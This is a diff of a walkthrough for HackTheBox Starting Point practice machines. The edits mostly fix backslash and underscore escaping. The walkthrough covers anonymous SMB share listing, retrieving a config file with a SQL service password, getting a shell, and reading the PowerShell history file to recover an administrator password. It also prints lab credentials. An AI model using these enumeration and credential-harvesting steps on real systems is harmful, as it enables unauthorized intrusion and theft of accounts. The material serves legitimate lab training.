@@ -103,7 +103,7 @@ other sensitive information. We can use smbclient to list available
 shares.
 
 ``` shell 
-smbclient -N -L \\\\10.10.10.27
+smbclient -N -L \\10.10.10.27
 
         Sharename       Type      Comment
         ---------       ----      -------
@@ -111,14 +111,14 @@ smbclient -N -L \\\\10.10.10.27
         backups         Disk      
         C$              Disk      Default share
         IPC$            IPC       Remote IPC
-        
+
 SMB1 disabled -- no workgroup available
 ```
 It seems there is a share called **backups**. Let's attempt to access it
 and see what's inside.
 
 ``` shell 
-smbclient -N  \\\\10.10.10.27\\backups
+smbclient -N  \\10.10.10.27\backups
 
 Try "help" to get a list of possible commands.
 smb: \> dir
@@ -126,24 +126,24 @@ smb: \> dir
   ..                                DR        0  Mon Jan 20 07:20:57 2020
   prod.dtsConfig                     AR      609  Mon Jan 20 07:23:02 2020
 
-smb: \\>
+smb: \>
 ```
 
 There is a <b>dtsConfig</b> file, which is a config file used with SSIS. Let’s
 see the code
 
 ```shell 
-smb: \\> get prod.dtsConfig
+smb: \> get prod.dtsConfig
   
-  getting file \\prod.dtsConfig of size 609 as prod.dtsConfig (3.5 KiloBytes/sec) (average 3.5 KiloBytes/sec)
+  getting file \prod.dtsConfig of size 609 as prod.dtsConfig (3.5 KiloBytes/sec) (average 3.5 KiloBytes/sec)
   
-smb: \\>
+smb: \>
 ```
 Checking the file we see:
 
 - The password: **M3g4c0rp123**
 
-- The user ID : **ARCHETYPE\\sql\_svc**
+- The user ID : **ARCHETYPE\sql_svc**
 ```shell 
 more prod.dtsConfig
 
@@ -153,7 +153,7 @@ more prod.dtsConfig
 
       …..
 
-      <ConfiguredValue>Data Source=.;Password=`**M3g4c0rp123`**; User ID=ARCHETYPE\`**sql_svc</b>`**;
+      <ConfiguredValue>Data Source=.;Password=M3g4c0rp123; User ID=ARCHETYPE\sql_svc; <- username and password
 
         .….
 
@@ -269,7 +269,7 @@ We can see from our mini webserver that a file has been downloaded
 
 <div style="width:100%; background-color:#252b34"><img src="StartingPoint_4.png"></div>
 
-A shell  is received as **sql\_svc**, and we can get the user.txt on
+A shell  is received as **sql_svc**, and we can get the user.txt on
 their desktop.
 
 <div style="width:100%; background-color:#252b34"><img src="StartingPoint_5.png"></div>
@@ -282,11 +282,11 @@ Using Tmux, that’s all in one window:
 
 As this is a normal user account as well as a service account, it is worth checking for frequently access files or executed commands. We can use the type(link)command to access the PowerShell history file (ConsoleHost_history.txt) to see the administrator’s credentials
 ``` code   
-  type C:\\Users\\sql\_svc\\AppData\\Roaming\\Microsoft\\Windows\\Powershell \\PSReadline\\ConsoleHost\_history.txt 
+  type C:\Users\sql_svc\AppData\Roaming\Microsoft\Windows\Powershell \PSReadline\ConsoleHost_history.txt 
 ```
-From the ConsoleHost\_history.txt we can see the administrator password:
+From the ConsoleHost_history.txt we can see the administrator password:
 ``` code
-  net.exe use T: \\\\Archetype\\backups /user:**administrator** **MEGACORP\_4dm1n!!**  
+  net.exe use T: \\Archetype\backups /user:**administrator** **MEGACORP_4dm1n!!**  
   exit  
 ```
 Below an image of the tree commands:
@@ -608,9 +608,9 @@ Let check the **db.php** file
 
 From the php.net manual page
 “https://www.php.net/manual/en/function.mysqli-connect.php”, we see how
-**mysqli\_connect** function works:
+**mysqli_connect** function works:
 ```code
-mysqli\_connect(DB\_HOST, DB\_USERNAME, DB\_PASSWORD,DB\_NAME);" 
+mysqli_connect(DB_HOST, DB_USERNAME, DB_PASSWORD,DB_NAME);" 
 ```
 
 So let’s use the page credentials in db.php : 
